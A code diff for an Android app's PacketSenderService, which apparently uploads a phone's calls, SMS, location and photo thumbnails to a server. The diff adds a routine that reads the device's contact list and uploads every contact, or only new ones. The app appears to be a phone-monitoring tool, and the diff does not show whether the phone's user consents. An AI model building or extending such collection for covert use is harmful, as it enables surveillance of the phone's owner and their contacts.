@@ -2,20 +2,30 @@ package net.deerhunter.ars.protocol;
 
 import java.io.ByteArrayOutputStream;
 import java.io.IOException;
+import java.util.ArrayList;
+import java.util.List;
 
+import net.deerhunter.ars.R;
+import net.deerhunter.ars.application.ArsApplication;
+import net.deerhunter.ars.contact_structs.ContactList;
+import net.deerhunter.ars.contact_structs.ContactsManager;
 import net.deerhunter.ars.protocol.packets.CallPacket;
+import net.deerhunter.ars.protocol.packets.ContactPacket;
 import net.deerhunter.ars.protocol.packets.DataType;
 import net.deerhunter.ars.protocol.packets.LocationPacket;
 import net.deerhunter.ars.protocol.packets.MainPacket;
 import net.deerhunter.ars.protocol.packets.SMSPacket;
 import net.deerhunter.ars.protocol.packets.ThumbnailPacket;
 import net.deerhunter.ars.providers.ActivityContract;
+import net.deerhunter.ars.providers.ActivityContract.Contacts;
 import net.deerhunter.ars.providers.ActivityContract.Thumbnails;
 import android.annotation.SuppressLint;
 import android.app.Service;
 import android.content.ContentResolver;
 import android.content.ContentValues;
 import android.content.Intent;
+import android.content.SharedPreferences;
+import android.content.SharedPreferences.Editor;
 import android.database.Cursor;
 import android.graphics.Bitmap;
 import android.graphics.Bitmap.CompressFormat;
@@ -28,6 +38,7 @@ import android.os.Looper;
 import android.os.Message;
 import android.os.Process;
 import android.provider.MediaStore;
+import android.util.Log;
 
 /**
  * This service is used to send packets to the server.
@@ -57,9 +68,62 @@ public class PacketSenderService extends Service {
 
 			sendNewThumbnails();
 
+			System.out.println("before send Contacts");
+			sendContactsIfNeed();
+			System.out.println("after send Contacts");
+			
 			// Stop the service using the startId, so that we don't stop
 			// the service in the middle of handling another job
 			stopSelf(msg.arg1);
+		}
+
+		private void sendContactsIfNeed() {
+			SharedPreferences prefs = ArsApplication.getInstance().getAppPrefs();
+			Editor prefsEditor = prefs.edit();
+			boolean needSendContacts = prefs.getBoolean(getString(R.string.needToSendContacts), false);
+			boolean onlyNew = prefs.getBoolean(getString(R.string.sendOnlyNewContacts), false);
+			System.out.println("before need send contacts: " + needSendContacts + " onlyNew = " + onlyNew);
+			if (needSendContacts){
+				if (sendContacts(onlyNew))
+					prefsEditor.putBoolean(getString(R.string.needToSendContacts), false);
+			}
+			System.out.println("after need send contacts");
+			prefsEditor.apply();			
+		}
+
+		private boolean sendContacts(boolean onlyNew) {
+			boolean areContactsSent = true;
+			ContactsManager contactsManager = ContactsManager.getInstance();
+			ContactList contacts = contactsManager.newContactList();
+			List<Integer> sentContactsIds = new ArrayList<Integer>();
+			if (onlyNew) {
+				Cursor cursor = getContentResolver().query(Contacts.CONTENT_URI, null, null, null, null);
+				if (cursor != null && cursor.moveToFirst()) {
+					do {
+						sentContactsIds.add(cursor.getInt(cursor.getColumnIndex(Contacts.SENT_CONTACT_ID)));
+					} while (cursor.moveToNext());
+				}
+			}
+			for (ContactPacket contact : contacts.getContacts()) {
+				if (onlyNew && sentContactsIds.contains(contact.getId()))
+					continue;
+				boolean uploaded = false;
+				try {
+					uploaded = Uploader.sendPacket(new MainPacket(DataType.CONTACT, contact.generateBinaryPacket()),
+							PacketSenderService.this);
+				} catch (IOException ex) {}
+
+				if (uploaded) {
+					ContentValues sentContact = new ContentValues();
+					sentContact.put(ActivityContract.Contacts.SENT_CONTACT_ID, contact.getId());
+					getContentResolver().insert(ActivityContract.Contacts.CONTENT_URI, sentContact);
+				}
+				else{
+					areContactsSent = false;
+				}
+					
+			}
+			return areContactsSent;
 		}
 
 		/**
@@ -96,8 +160,7 @@ public class PacketSenderService extends Service {
 
 			} catch (IOException e) {
 				e.printStackTrace();
-			}
-			finally{
+			} finally {
 				if (c != null)
 					c.close();
 			}
@@ -166,8 +229,7 @@ public class PacketSenderService extends Service {
 
 			} catch (IOException e) {
 				e.printStackTrace();
-			}
-			finally{
+			} finally {
 				if (c != null)
 					c.close();
 			}
@@ -206,8 +268,7 @@ public class PacketSenderService extends Service {
 
 			} catch (IOException e) {
 				e.printStackTrace();
-			}
-			finally{
+			} finally {
 				if (c != null)
 					c.close();
 			}
@@ -247,8 +308,7 @@ public class PacketSenderService extends Service {
 
 			} catch (IOException e) {
 				e.printStackTrace();
-			}
-			finally{
+			} finally {
 				if (c != null)
 					c.close();
 			}
@@ -294,6 +354,5 @@ public class PacketSenderService extends Service {
 	}
 
 	@Override
-	public void onDestroy() {
-	}
+	public void onDestroy() {}
 }
